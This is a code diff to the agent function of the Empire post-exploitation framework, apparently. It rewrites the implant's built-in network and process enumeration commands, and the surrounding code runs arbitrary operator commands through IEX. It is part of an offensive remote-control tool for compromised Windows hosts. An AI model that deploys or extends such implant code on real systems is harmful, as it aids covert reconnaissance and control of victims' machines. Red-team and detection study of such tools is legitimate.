@@ -315,57 +315,96 @@ function Invoke-Empire {
             mv { if ($cmdargs.length -ne ""){ $output = mv $cmdargs }}
             arp { $output = arp -a }
             netstat { $output = netstat -a }
-            ipconfig { $output = ipconfig -all }
-            ifconfig { $output = ipconfig -all }
+            ipconfig {
+                $output = Get-WmiObject -class "Win32_NetworkAdapterConfiguration" | ? {$_.IPEnabled -Match "True"} | % {
+                    $out = New-Object psobject
+                    $out | Add-Member Noteproperty 'Description' $_.Description
+                    $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress
+                    $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled
+                    $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",")
+                    $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",")
+                    $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",")
+                    $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",")
+                    $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
+                    $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
+                    $out
+                } | fl | Out-String | %{$_ + "`n"}
+            }
+            ifconfig {
+                $output = Get-WmiObject -class "Win32_NetworkAdapterConfiguration" | ? {$_.IPEnabled -Match "True"} | % {
+                    $out = New-Object psobject
+                    $out | Add-Member Noteproperty 'Description' $_.Description
+                    $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress
+                    $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled
+                    $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",")
+                    $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",")
+                    $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",")
+                    $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",")
+                    $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
+                    $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
+                    $out
+                } | fl | Out-String | %{$_ + "`n"}
+            }
 
             # this is stupid how complicated it is to get this information...
             ps { 
-                if ($cmdargs.length -ne "") {
-                    $output = tasklist /V /FO CSV | ConvertFrom-Csv | Where-Object {$_."Image Name" -match $cmdargs} | Select-Object -Property 'Image Name', 'PID', 'User Name', 'Mem Usage'
-                } 
-                else {
-                    $output = tasklist /V /FO CSV | ConvertFrom-Csv | ?{$_.'Image Name' -ne "tasklist.exe"} | Select-Object -Property 'Image Name', 'PID', 'User Name', 'Mem Usage'
-                }
-                if ([System.IntPtr]::Size -eq 4){
-                    # if we're running ps on an x86 architecture
-                    $output = $output | % {
-                        $process = Get-Process -Id $_.PID
+                $owners = @{}
+                gwmi win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
+                if($cmdargs -ne "") { $p = $cmdargs }
+                else{ $p = "*" }
+                $output = Get-Process $p | % {
+                    $arch = "x64"
+                    if ([System.IntPtr]::Size -eq 4){
                         $arch = "x86"
-                        $out = New-Object psobject
-                        $out | Add-Member Noteproperty 'ProcessName' $_.'Image Name'
-                        $out | Add-Member Noteproperty 'PID' $_.PID
-                        $out | Add-Member Noteproperty 'Arch' $arch
-                        $out | Add-Member Noteproperty 'UserName' $_.'User Name'
-                        $out | Add-Member Noteproperty 'MemUsage' $_.'Mem Usage'
-                        $out
-                    } | ft -wrap
-                }
-                else {
-                    # otherwise we're x64
-                    $output = $output | % {
-                        $process = Get-Process -Id $_.PID
-                        $arch = "x64"
-                        $modules = $process.modules
-                        foreach($module in $process.modules) {
+                    }
+                    else{
+                        foreach($module in $_.modules) {
                             if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
                                 $arch = "x86"
                                 break
                             }
                         }
-                        $out = New-Object psobject
-                        $out | Add-Member Noteproperty 'ProcessName' $_.'Image Name'
-                        $out | Add-Member Noteproperty 'PID' $_.PID
-                        $out | Add-Member Noteproperty 'Arch' $arch
-                        $out | Add-Member Noteproperty 'UserName' $_.'User Name'
-                        $out | Add-Member Noteproperty 'MemUsage' $_.'Mem Usage'
-                        $out
-                    } | ft -wrap
-                }
+                    }
+                    $out = New-Object psobject
+                    $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
+                    $out | Add-Member Noteproperty 'PID' $_.ID
+                    $out | Add-Member Noteproperty 'Arch' $arch
+                    $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
+                    $mem = "{0:N2} MB" -f $($_.WS/1MB)
+                    $out | Add-Member Noteproperty 'MemUsage' $mem
+                    $out
+                } | Sort-Object -Property PID
             }
 
-            tasklist { $output = tasklist /V /FO CSV | ConvertFrom-Csv | Select-Object -Property 'Image Name', 'PID', 'Session Name', 'User Name', 'Mem Usage' | ft -wrap}
+            tasklist { 
+                $owners = @{}
+                gwmi win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
+                if($cmdargs -ne "") { $p = $cmdargs }
+                else{ $p = "*" }
+                $output = Get-Process $p | % {
+                    $arch = "x64"
+                    if ([System.IntPtr]::Size -eq 4){
+                        $arch = "x86"
+                    }
+                    else{
+                        foreach($module in $_.modules) {
+                            if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
+                                $arch = "x86"
+                                break
+                            }
+                        }
+                    }
+                    $out = New-Object psobject
+                    $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
+                    $out | Add-Member Noteproperty 'PID' $_.ID
+                    $out | Add-Member Noteproperty 'Arch' $arch
+                    $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
+                    $mem = "{0:N2} MB" -f $($_.WS/1MB)
+                    $out | Add-Member Noteproperty 'MemUsage' $mem
+                    $out
+                } | Sort-Object -Property PID
+            }
             getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() | ft -wrap }
-            net { if ($cmdargs.length -ne ""){ $output = net $cmdargs }}
             route {
                 if ($cmdargs.length -eq ""){ $output = route print }
                 else { $output = route $cmdargs }
@@ -380,7 +419,7 @@ function Invoke-Empire {
                 else { $output = IEX "$cmd $cmdargs" }
             }
         }
-        "`n"+($output | format-table -wrap | out-string)
+        "`n"+($output | Format-Table -wrap | Out-String)
     }
 
     function Start-AgentJob {
